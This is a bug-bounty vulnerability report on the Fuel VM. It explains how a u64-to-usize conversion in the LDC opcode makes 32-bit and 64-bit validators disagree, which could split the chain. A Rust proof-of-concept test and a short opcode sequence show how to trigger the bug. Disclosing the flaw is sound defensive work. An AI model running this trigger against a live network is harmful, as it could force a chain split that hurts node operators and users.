# Attackathon \_ Fuel Network 32825 - \[Blockchain\_DLT - High] Consensus between -bit and -bit system ca

Submitted on Thu Jul 04 2024 07:53:29 GMT-0400 (Atlantic Standard Time) by @ret2happy for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32825

Report type: Blockchain/DLT

Report severity: High

Target: <https://github.com/FuelLabs/fuel-vm/tree/0e46d324da460f2db8bcef51920fb9246ac2143b>

Impacts:

* Unintended permanent chain split requiring hard fork (network partition requiring hard fork)

## Description

Consensus between 32-bit and 64-bit system can fail

## Brief/Intro

Consensus between 32bit and 64bit systems might fail due to a failure type conversion in the LDC opcode implementation \[1]. Executing malicious LDC opcode leads to the different result (PanicReason) on validators with different architecture.

## Vulnerability Details

In the interpreter/blockchain.rs#L597-L607 \[1], the loaded contract length is the 64-bit register value. However, it uses `padded_len_usize` to convert `u64` to `usize`. Note that `usize` can either be 32 bit or 64 bit depending on the architecture.

* If the validators running on the `32-bit` system (e.g., wasm), the `usize` here is `u32`, and this would cause `PanicReason::MemoryOverflow` as the following code shows.
* If the validators running on the `64-bit` system, the `usize` here is `u64`, and `try_into` conversion will success.

Consider we already set the $rC to u64::MAX (will demonstrate it more detail in PoC), we will get `PanicReason::MemoryOverflow` on 32-bit system, and get `PanicReason::ContractMaxSize` on 64-bit system.

```
        let length = bytes::padded_len_usize(
            length_unpadded
                .try_into() // On 32-bit system, this try_into will fail since we fail to convert a large u64 value (e.g., u64::MAX) to u32
                            // while on 64-bit system, this conversion never failed 
                .map_err(|_| PanicReason::MemoryOverflow)?,
        )        
        .map(|len| len as Word)
        .unwrap_or(Word::MAX);

        if length > self.contract_max_size {
            return Err(PanicReason::ContractMaxSize.into())
        }
```

## Impact Details

Since executing the same program result in different panic reason on different validators, the consensus is broken. More specifically, because the receipt contains the panic reason and ultimately influences the block header hash, the block header hash will be incorrect. This would read to the network fork.

## References

\[1] <https://github.com/FuelLabs/fuel-vm/blob/ae91bbdc804b870a84efe0bc6d18f43a79f351e7/fuel-vm/src/interpreter/blockchain.rs#L597-L607>

## Proof of concept

## Proof of Concept

The following PoC get `PanicReason::ContractMaxSize` on a 64bit system but get `PanicReason::MemoryOverflow` on a 32bit system.

```
// please add this to the `fuel-vm/src/interpreter/blockchain/code_tests.rs` for testing
#[test]
fn test_load_contract_with_truncation() -> IoResult<(), Infallible> {
    let mut storage = MemoryStorage::default();
    let mut memory: MemoryInstance = vec![1u8; MEM_SIZE].try_into().unwrap();
    let mut pc = 4;
    let mut cgas = 1000;
    let mut ggas = 1000;
    let mut ssp = 1000;
    let mut sp = 1000;
    let fp = 32;
    let is = 0;
    let hp = VM_MAX_RAM;

    let contract_id = ContractId::from([4u8; 32]);

    let contract_id_mem_address: Word = 32;
    let offset = 20;
    let num_bytes = u64::MAX; //40;
    const CONTRACT_SIZE: u64 = 400;

    memory[contract_id_mem_address as usize
        ..contract_id_mem_address as usize + ContractId::LEN]
        .copy_from_slice(contract_id.as_ref());
    storage
        .storage_contract_insert(
            &contract_id,
            &Contract::from(vec![5u8; CONTRACT_SIZE as usize]),
        )
        .unwrap();

    let mut panic_context = PanicContext::None;
    let input_contracts = [contract_id];
    let input_contracts = input_contracts.into_iter().collect();
    let input = LoadContractCodeCtx {
        contract_max_size: 100,
        storage: &storage,
        memory: &mut memory,
        context: &Context::Call {
            block_height: Default::default(),
        },
        profiler: &mut Profiler::default(),
        input_contracts: InputContracts::new(&input_contracts, &mut panic_context),
        gas_cost: DependentCost::from_units_per_gas(13, 1),
        cgas: RegMut::new(&mut cgas),
        ggas: RegMut::new(&mut ggas),
        ssp: RegMut::new(&mut ssp),
        sp: RegMut::new(&mut sp),
        hp: Reg::new(&hp),
        fp: Reg::new(&fp),
        pc: RegMut::new(&mut pc),
        is: Reg::new(&is),
    };
    input.load_contract_code(contract_id_mem_address, offset, num_bytes)?;
    Ok(())
}
```

To test conveniently on the 32-bit system, I add the `padded_len_usize_32bit` function to simulate the `u32` type for 32-bit system, in the `fuel-types/src/bytes.rs`:

```
#[allow(clippy::arithmetic_side_effects)] // Safety: (a % b) < b
pub const fn padded_len_usize_32bit(len: u32) -> Option<u32> {
    let modulo = len % WORD_SIZE as u32;
    if modulo == 0 {
        Some(len)
    } else {
        let padding = WORD_SIZE as u32 - modulo;
        len.checked_add(padding)
    }
}
```

And I also change the `fuel-vm/src/interpreter/blockchain.rs#L597` from `padded_len_usize` to `padded_len_usize_32bit`:

```
let length = bytes::padded_len_usize_32bit(
    length_unpadded
        .try_into()
        .map_err(|_| PanicReason::MemoryOverflow)?,
)
```

Runnning the above PoC, we get different result on 32/64-bit system.

Moreover, the simplified fuel PoC program could be:

```
op::movi(reg_a, count), // r[a] := ContractId::LEN
op::aloc(reg_a),        // Reserve space for contract id in the heap
op::move_(reg_a, RegId::HP),         // r[a] := $hp // id
op::movi(reg_b, 0),             // r[b] = 0 // offset
op::subi(reg_c, reg_c, 1),         // r[c] := u64::MAX // len
op::ldc(reg_a, reg_b, reg_c),        // Load first two words from the contract
op::lw(reg_c, RegId::FP, 0x240 / 8), // r[c] := code_size
```
